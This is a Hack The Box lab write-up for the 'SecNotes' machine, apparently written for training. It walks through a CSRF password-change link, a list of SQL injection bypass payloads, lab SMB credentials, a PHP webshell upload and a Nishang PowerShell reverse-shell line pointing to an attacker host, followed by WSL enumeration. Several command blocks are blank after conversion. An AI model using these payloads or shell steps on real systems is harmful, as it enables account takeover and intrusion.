# SecNotes

*Converted from: SecNotes.pdf*

---

# SecNotes
## **14 [th] January 2019 / Document No D19.100.03**

**Prepared By: egre55**

**Machine Author: 0xdf**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 14


## **SYNOPSIS**

SecNotes is a medium difficulty machine, which highlights the risks associated with weak

password change mechanisms, lack of CSRF protection and insufficient validation of user input. It

also teaches about Windows Subsystem for Linux enumeration.


## **Skills Required**


  - Basic knowledge of web application

vulnerabilities and associated tools

  - Basic Windows knowledge


## **Skills Learned**


  - CSRF payload creation

  - SQLi authentication bypass

  - Windows Subsystem for Linux

Enumeration


Page 2 / 14


## **Enumeration** **Nmap**





Nmap reveals that an IIS installation listening on ports 80 and 8808 is available. Port 445 is open,

which reveals that the Windows File Sharing service (SMB) is also accessible.


Visual inspection of the two IIS instances reveals a custom PHP web application on port 80, and

the default IIS welcome page on port 8808.


Page 3 / 14


Page 4 / 14


## **Vulnerability Validation** **Weak Password Change Mechanism**

A common issue with password change mechanisms is a failure to validate that the user knows

the existing password. Password recovery mechanisms also allow users to change their

password without knowing the existing password, but may require an additional verification step,

such as sending the reset request to the email address associated with the username. If a

malicious user gets a victim to click on a malicious password change request, and validation of

the existing password is not required, then they may be able to take control of the account.


Page 5 / 14


​ ​ ​ ​


## **Cross-Site Request Forgery (CSRF)**

The "Contact Us" form is directed to tyler, and if a malicious password reset request is sent to this

user, they might click the link. CSRF tokens would defend against this attack, but they haven’t

been implemented in the web application. In Burp, the "Change Password" request type is

changed from POST to GET, and the malicious URL is constructed.


http://10.10.10.97/change_pass.php?password=newpassword&confirm_password=newpas

sword&submit=submit


The URL is pasted into the message body of the Contact request, and after a short while the

credentials ​ tyler:newpassword​ ​ can be used to log into the website. ​


Once logged in, credentials to access a SMB share are found.


Page 6 / 14



​ ​ ​ ​



​ ​ ​ ​


​

​
​
​

​


## **Second-Order SQL Injection**

Access to the SMB credentials can also be gained by bypassing the authentication mechanism.

The website is tested for SQL vulnerabilities. A number of authentication bypass payloads are

selected the from the SecLists Generic-SQLi list.


[https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Generic-SQLi.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Generic-SQLi.txt)


' or 0=0 --​
' or 0=0 #
' or 0=0 #"
' or '1'='1'--​
' or 1 --'​
' or 1=1--​
' or 1=1 or ''='
' or 1=1 or ""=
' or a=a--​
' or a=a
') or ('a'='a
'hi' or 'x'='x';


The login request is sent to the Burp Intruder module (CTRL + I), but this test is not successful.


Page 7 / 14



​

​
​
​

​


​ ​



​ ​



The register page is tested next, and a payload of ' or 1=1-- ​ returns the result "This ​

username is already taken". Other payloads seem to have been accepted and registered as valid

user accounts.


Page 8 / 14



​ ​



​ ​


​

​



The login page is tested again, and this time - logging in with the username SVRZREVZ' or 0=0 ​

​



​

#" is successful, the SQL injection is triggered and the note containing the SMB share ​



​

​

credentials is visible.



​

​



​

​


Page 9 / 14


​ ​


## **Foothold** **SMB Share Access**

The details below are used to access the "new-site" share, which seems to be the IIS webroot

(wwwroot).


\\secnotes.htb\new-site

tyler / 92g!mA8BGjOirkL%OG*&


Write access is possible, and a minimal PHP webshell with the contents below is uploaded

(smbclient command: put SCAVEFVR.php​ ). ​



​ ​



​ ​



​ ​



​ ​


Command execution as SECNOTES\tyler is achieved.



​ ​



​ ​


Page 10 / 14


## **Upgrade Webshell to Reverse Shell**

In order to get a proper shell, the "Invoke-PowerShellTcp.ps1" PowerShell script from the Nishang

Penetration Testing Framework (created by Nikhil Mittal / @nikhil_mitt) can be used.


[https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)


The following line is added to the end of the script, and this too is uploaded.


Invoke-PowerShellTcp -Reverse -IPAddress <IP Address> -Port <Port>


The following command is used to execute the reverse shell payload.





This is encoded in Burp (CTRL+U), the request is sent and a shell as SECNOTES\tyler is received.


Page 11 / 14


## **Privilege Escalation** **Discovery of Administrator Password**

Enumeration of the C:\ reveals the file "Ubuntu.zip" and a "Distros\Ubuntu" folder. Potentially

Windows Subsystem for Linux (WSL) has been installed?


In order to check if WSL has been installed, the following command is issued.





The confirms that WSL has been installed, and the Linux filesystem has been installed to the path

below.


C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindow

s_79rhkp1fndgsc\LocalState


The Linux filesystem is enumerated.





Page 12 / 14


The same enumeration can also be carried out using bash.





Page 13 / 14


## **Shell as SECNOTES\Administrator**

A SYSTEM shell can be gained using the Impacket’s psexec.py.





Page 14 / 14


